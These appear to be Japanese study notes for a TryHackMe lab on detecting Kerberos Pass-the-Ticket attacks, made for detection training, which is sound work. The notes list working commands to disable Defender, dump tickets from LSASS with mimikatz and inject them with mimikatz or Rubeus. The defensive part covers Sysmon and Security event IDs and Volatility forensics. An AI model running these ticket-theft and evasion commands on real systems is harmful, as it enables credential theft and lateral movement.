# Pass-the-Ticket攻撃の検出

https://tryhackme.com/room/passtheticketattackdetection

## 基礎

LSASSメモリは、ローカル管理者権限で実行されているプロセスであればどれでも読み取ることができる。この権限レベルに達した攻撃者は、アカウントのパスワードやハッシュ値に触れることなく、キャッシュされたTGTをメモリから直接抽出できる。

### Pass-the-Ticket攻撃の段階

1. 侵害されたホスト上のLSASSメモリからTGTを抽出する
2. 盗んだチケットを攻撃者自身のログオンセッションに挿入する
3. 被害者としてサービスチケットをリクエストする（例：ネットワーク共有に対して）
4. そのアカウントがアクセス権限を持つリソースにアクセスする

### 攻撃手順

Defenderの停止

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

チケットをエクスポート

```sh
mimikatz.exe
# privilege::debug
# sekurlsa::tickets /export
```

ファイル一覧

```sh
dir *.kirbi
```

#### kirbiファイル名の解釈

`[0;6ee947]-2-1-40e10000-alex.admin@krbtgt-LAB.LOCAL.kirbi` は次のような意味。

- [0;6ee947]ログオンID 0x6EE947のセッションから取得。
- -2グループ2なので、これはTGTであり、サービスチケットではない。
- -1: これはそのセッションにおける2番目のTGT。インデックスは0始まり。複数ある場合、大きい番号のほうが新しい（有効）な可能性が高い。
- -40e10000: チケットフラグ
- alex.admin: このチケットはalex.adminという名前のユーザーのもの。
- @krbtgt-LAB.LOCAL: krbtgtサービスのチケット。

mimikatzを使ったTGTの注入

```sh
mimikatz.exe
# kerberos::ptt "TGT-ticket-name.kirbi"
```

Rubeus を使ったTGTの注入

```sh
Rubeus.exe ptt /ticket:"TGT-ticket-name.kirbi"
```

チケットの確認

```sh
klist
```

リソースにアクセス

```sh
dir \\DC01\SecureShare
```

## イベントログ

### 1. 認証情報の盗難を証明（送信元ホスト）

#### Sysmon 1, Security 4688 プロセス作成

TGTをダンプした既知の認証情報窃盗ツール（mimikatz）のプロセス実行痕跡。

#### Sysmon 10 プロセスアクセス

ダンプには、Lsassプロセスへのアクセスが必要。

#### Sysmon 11 ファイル作成

kirbiファイル作成。

### 2. チケットの挿入を検出（送信元ホスト）

下記のように起動された場合は、コマンドラインに痕跡が残る可能性がある。mimikatzコンソール内で入力した場合は痕跡は残らない。

```sh
mimikatz.exe "kerberos::ptt TGT-ticket-name.kirbi"。Rubeus.exe ptt /ticket:"TGT-ticket-name.kirbi"
```

### 3. 漏洩したアカウント（送信元ホスト）を特定

#### Security 4624 ログオン

ログオンタイプ10。TGT抽出する前に、ワークステーションにドメイン管理者がRDP接続していたからlsassメモリにチケットが入っていたという文脈。ログオンIDがkirbiファイルの一部と一致しているか？

### 4. 横方向の動きを追跡（標的宿主）

#### Security 5140 / 5145 SMBファイル共有アクセス

ソースIPが侵害されたマシンと一致しているか？

## アーティファクト

### メモリイメージ

プロセスを列挙

```sh
volatility.exe -f "ws01.raw" windows.pslist > pslist.txt
volatility.exe -f "ws01.raw" windows.pstree > pstree.txt
```

cmd等のシェルプロセスのハンドルを調査

```sh
volatility.exe -f "ws01.raw" windows.handles --pid 7644 > handles_7644.txt
volatility.exe -f "ws01.raw" windows.handles --pid 5476 > handles_5476.txt
```

コマンド履歴を復元

```sh
volatility.exe -f "ws01.raw" windows.cmdscan  > cmdscan.txt
volatility.exe -f "ws01.raw" windows.consoles > consoles.txt
```

### MFT

kirbiファイルなどを調査

## 封じ込め、緩和

https://tryhackme.com/room/passtheticketattackdetection?taskNo=5&sharerId=674ed42e2374d1bc93db444c
